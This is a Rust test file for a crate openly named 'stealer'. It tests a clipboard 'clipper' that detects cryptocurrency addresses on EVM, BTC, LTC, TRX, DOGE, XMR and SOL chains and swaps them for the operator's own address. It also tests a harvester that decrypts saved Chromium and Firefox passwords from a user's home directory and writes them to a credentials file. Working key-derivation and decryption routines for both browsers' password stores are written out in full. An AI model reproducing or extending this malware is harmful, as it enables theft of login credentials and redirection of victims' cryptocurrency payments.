#![cfg(unix)]

//! Acceptance tests for the harvester and the clipboard monitor.

use std::{fs, path::Path, process::Command, sync::Mutex};

use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
type Aes128 = cbc::Encryptor<aes::Aes128>;
use base64::Engine;
use hmac::{Hmac, Mac};
use pbkdf2::pbkdf2_hmac;
use sha1::{Digest, Sha1};
use stealer::{
    addr,
    clip::{self, Config, FileClipboard},
};
use tempfile::TempDir;

type TripleDes = cbc::Encryptor<des::TdesEde3>;
type HmacSha1 = Hmac<Sha1>;

static ENV: Mutex<()> = Mutex::new(());

const EVM_A: &str = "0x52908400098527886E0F7030069857D2E4169EE7";
const EVM_B: &str = "0x8617E340B3D01FA5F11F306F4090FD50E238070D";
const BTC: &str = "1111111111111111111114oLvT2";
const LTC: &str = "LLnCCHbSzfwWquEdaS5TF2Yt7uz5Qb1SZ1";
const TRX: &str = "TFvF6WzyeRKMM8NcbddxL88mZXTeuUWA8Z";
const DOGE: &str = "D8FaQQWt8SJCiCGYYBAsUn8qhXxthiYBro";
const XMR: &str = "BPrmh5BuLB4i2XbbdEzqhFGoi4Q36p2BzQDoCiX4tJsDWhNamctMjWtqYLLxpTda5Na3tCDnTajF3YZ8eeEaBHH9xA8WSD";
const SOL: &str = "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU";

#[test]
fn detects_supported_chains_and_rejects_junk() {
    assert_eq!(addr::detect(EVM_A).unwrap().chain, "evm");
    assert_eq!(addr::detect(BTC).unwrap().chain, "btc_legacy");
    assert_eq!(addr::detect(LTC).unwrap().chain, "ltc");
    assert_eq!(addr::detect(TRX).unwrap().chain, "trx");
    assert_eq!(addr::detect(DOGE).unwrap().chain, "doge");
    assert_eq!(addr::detect(XMR).unwrap().chain, "xmr");
    assert_eq!(addr::detect(SOL).unwrap().chain, "sol");
    assert!(addr::detect("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4").is_some());

    assert!(addr::detect("hello world").is_none());
    assert!(addr::detect("0x1234").is_none());
    // Corrupt the Base58 checksum.
    let mut broken = BTC.to_owned();
    broken.pop();
    broken.push('3');
    assert!(addr::detect(&broken).is_none());
    // Two addresses in one clipboard.
    assert!(addr::detect(&format!("{EVM_A} {EVM_B}")).is_none());
}

#[test]
fn replacement_prefers_chain_then_generic() {
    let mut map = std::collections::BTreeMap::new();
    map.insert("evm".to_owned(), EVM_B.to_owned());
    map.insert("btc".to_owned(), "bc1qour".to_owned());
    let detected = addr::detect(EVM_A).unwrap();
    assert_eq!(addr::replacement(&detected, &map), Some(EVM_B));
    let detected = addr::detect(BTC).unwrap();
    assert_eq!(addr::replacement(&detected, &map), Some("bc1qour"));
    // Copying our own address is a no-op.
    map.insert("evm".to_owned(), EVM_A.to_owned());
    assert_eq!(addr::replacement(&addr::detect(EVM_A).unwrap(), &map), None);
}

#[test]
fn file_backend_replaces_once_and_leaves_text_alone() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("clipboard.txt");
    fs::write(&path, EVM_A).unwrap();
    let mut clipboard = FileClipboard::new(&path);
    let mut config = Config::default();
    config.addresses.insert("evm".into(), EVM_B.into());
    let mut last = String::new();
    let step = clip::step(&mut clipboard, &config, &mut last).unwrap();
    assert!(matches!(step, clip::Step::Replaced(_)));
    assert_eq!(fs::read_to_string(&path).unwrap(), EVM_B);
    // Our address is already ours: no event.
    assert_eq!(
        clip::step(&mut clipboard, &config, &mut last).unwrap(),
        clip::Step::Idle
    );
    fs::write(&path, "nothing interesting").unwrap();
    assert_eq!(
        clip::step(&mut clipboard, &config, &mut last).unwrap(),
        clip::Step::Foreign
    );
    assert_eq!(fs::read_to_string(&path).unwrap(), "nothing interesting");
}

fn clipwatch() -> Command {
    Command::new(env!("CARGO_BIN_EXE_clipwatch"))
}

#[test]
fn clipwatch_binary_swaps_a_copied_address() {
    let dir = TempDir::new().unwrap();
    let clipboard = dir.path().join("clipboard.txt");
    fs::write(&clipboard, EVM_A).unwrap();
    let status = clipwatch()
        .arg("--state")
        .arg(dir.path())
        .arg("--backend")
        .arg("file")
        .arg("--once")
        .arg("--set")
        .arg(format!("evm={EVM_B}"))
        .status()
        .expect("clipwatch runs");
    assert!(status.success(), "{status:?}");
    assert_eq!(fs::read_to_string(&clipboard).unwrap(), EVM_B);
    let log = fs::read_to_string(dir.path().join("clipwatch.log")).unwrap();
    assert!(log.contains(EVM_A) && log.contains(EVM_B), "{log}");
    let saved: Config =
        serde_json::from_slice(&fs::read(dir.path().join("clip.json")).unwrap()).unwrap();
    assert_eq!(saved.addresses.get("evm"), Some(&EVM_B.to_owned()));
}

fn encrypt(key: &[u8], iv: &[u8], plain: &[u8]) -> Vec<u8> {
    let mut buffer = plain.to_vec();
    let length = buffer.len();
    buffer.resize(length + 8 - length % 8, 0);
    TripleDes::new_from_slices(key, iv)
        .unwrap()
        .encrypt_padded_mut::<Pkcs7>(&mut buffer, length)
        .unwrap()
        .to_vec()
}

fn aes_encrypt(key: &[u8], iv: &[u8], plain: &[u8]) -> Vec<u8> {
    let mut buffer = plain.to_vec();
    let length = buffer.len();
    buffer.resize(length + 16 - length % 16, 0);
    Aes128::new_from_slices(key, iv)
        .unwrap()
        .encrypt_padded_mut::<Pkcs7>(&mut buffer, length)
        .unwrap()
        .to_vec()
}

fn pbkdf(secret: &[u8], salt: &[u8], rounds: u32) -> Vec<u8> {
    let mut key = vec![0_u8; 16];
    pbkdf2_hmac::<Sha1>(secret, salt, rounds, &mut key);
    key
}

fn hmac(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha1::new_from_slice(key).unwrap();
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

fn mozilla_key(global: &[u8], entry: &[u8]) -> (Vec<u8>, Vec<u8>) {
    let hp = Sha1::digest([global, b""].concat());
    let chp = Sha1::digest([hp.as_slice(), entry].concat());
    let mut padded = entry.to_vec();
    padded.resize(20, 0);
    let k1 = hmac(&chp, &[padded.as_slice(), entry].concat());
    let tk = hmac(&chp, &padded);
    let k2 = hmac(&chp, &[tk.as_slice(), entry].concat());
    let key = [k1, k2].concat();
    (key[..24].to_vec(), key[32..40].to_vec())
}

fn der(tag: u8, body: &[u8]) -> Vec<u8> {
    assert!(body.len() < 128);
    let mut out = vec![tag, body.len() as u8];
    out.extend_from_slice(body);
    out
}

fn pbe_blob(oid: &[u8], salt: &[u8], _iv: &[u8], ciphertext: &[u8]) -> Vec<u8> {
    let algorithm = der(
        0x30,
        &[
            der(0x06, oid),
            der(0x30, &[der(0x04, salt), der(0x02, &[1])].concat()),
        ]
        .concat(),
    );
    der(0x30, &[algorithm, der(0x04, ciphertext)].concat())
}

fn login_blob(iv: &[u8], ciphertext: &[u8]) -> String {
    let key_id = der(0x04, &hex_id());
    let algorithm = der(
        0x30,
        &[
            der(
                0x06,
                &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x03, 0x07],
            ),
            der(0x04, iv),
        ]
        .concat(),
    );
    base64::engine::general_purpose::STANDARD.encode(der(
        0x30,
        &[key_id, algorithm, der(0x04, ciphertext)].concat(),
    ))
}

fn hex_id() -> Vec<u8> {
    let mut id = vec![0xf8];
    id.extend_from_slice(&[0_u8; 15]);
    id[15] = 1;
    id
}

#[test]
fn harvest_reads_chromium_and_firefox_profiles() {
    let _guard = ENV.lock().unwrap();
    let home = TempDir::new().unwrap();
    let out = TempDir::new().unwrap();
    std::env::set_var("HOME", home.path());

    // Chromium v10 with the Linux fallback key.
    let profile = home.path().join(".config/google-chrome/Default");
    fs::create_dir_all(&profile).unwrap();
    let key = pbkdf(&b"peanuts"[..], b"saltysalt", 1);
    let iv = [b' '; 16];
    let mut encrypted = b"v10".to_vec();
    encrypted.extend_from_slice(&aes_encrypt(&key, &iv, b"hunter2"));
    let database = rusqlite::Connection::open(profile.join("Login Data")).unwrap();
    database
        .execute_batch(
            "CREATE TABLE logins(origin_url TEXT, username_value TEXT, password_value BLOB, date_created INTEGER);
             INSERT INTO logins VALUES('https://example.test','h1t3m', x'00', 1);",
        )
        .unwrap();
    database
        .execute("UPDATE logins SET password_value=?1", [&encrypted])
        .unwrap();
    drop(database);
    fs::write(profile.join("../Local State"), br#"{"os_crypt":{}}"#).unwrap();

    // Firefox key4.db with the legacy 3DES scheme.
    let firefox = home.path().join(".mozilla/firefox/abc.default");
    fs::create_dir_all(&firefox).unwrap();
    let global = [3_u8; 20];
    let entry = [4_u8; 20];
    let (check_key, check_iv) = mozilla_key(&global, &entry);
    let check = encrypt(&check_key, &check_iv, b"password-check\x02\x02");
    let key4 = rusqlite::Connection::open(firefox.join("key4.db")).unwrap();
    key4.execute_batch(
        "CREATE TABLE metadata(id TEXT PRIMARY KEY, item1 BLOB, item2 BLOB);
         CREATE TABLE nssPrivate(id INTEGER PRIMARY KEY, a11 BLOB, a102 BLOB);",
    )
    .unwrap();
    key4.execute(
        "INSERT INTO metadata VALUES('password', ?1, ?2)",
        rusqlite::params![
            global,
            pbe_blob(
                &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x0c, 0x05, 0x01, 0x03],
                &entry,
                &check_iv,
                &check
            )
        ],
    )
    .unwrap();
    let material_key = [9_u8; 24];
    let login_iv = [7_u8; 8];
    let (wrap_key, wrap_iv) = mozilla_key(&global, &entry);
    let wrapped = encrypt(&wrap_key, &wrap_iv, &material_key);
    key4.execute(
        "INSERT INTO nssPrivate VALUES(1, ?1, ?2)",
        rusqlite::params![
            pbe_blob(
                &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x0c, 0x05, 0x01, 0x03],
                &entry,
                &wrap_iv,
                &wrapped
            ),
            entry
        ],
    )
    .unwrap();
    drop(key4);
    fs::write(
        firefox.join("logins.json"),
        serde_json::json!({"logins":[{
            "hostname":"https://bank.test",
            "encryptedUsername": login_blob(&login_iv, &encrypt(&material_key, &login_iv, b"anthony")),
            "encryptedPassword": login_blob(&login_iv, &encrypt(&material_key, &login_iv, b"s3cret")),
        }]})
        .to_string(),
    )
    .unwrap();

    let browser = stealer::browser::harvest(out.path(), 10);
    assert_eq!(browser.credentials.len(), 1, "{:?}", browser.warnings);
    assert_eq!(browser.credentials[0].password, "hunter2");
    assert_eq!(browser.credentials[0].username, "h1t3m");

    let firefox = stealer::firefox::harvest(10);
    assert_eq!(firefox.logins.len(), 1, "{:?}", firefox.warnings);
    assert_eq!(firefox.logins[0].username, "anthony");
    assert_eq!(firefox.logins[0].password, "s3cret");

    std::env::remove_var("HOME");
}

#[test]
fn harvest_binary_writes_a_manifest() {
    let _guard = ENV.lock().unwrap();
    let home = TempDir::new().unwrap();
    let out = TempDir::new().unwrap();
    std::env::set_var("HOME", home.path());
    let status = Command::new(env!("CARGO_BIN_EXE_harvest"))
        .arg("--state")
        .arg(home.path())
        .arg("--out")
        .arg(out.path())
        .arg("--no-firefox")
        .arg("--no-keyring")
        .status()
        .expect("harvest runs");
    assert!(status.success());
    assert!(Path::new(&out.path().join("manifest.json")).is_file());
    assert!(Path::new(&out.path().join("credentials.json")).is_file());
    std::env::remove_var("HOME");
}
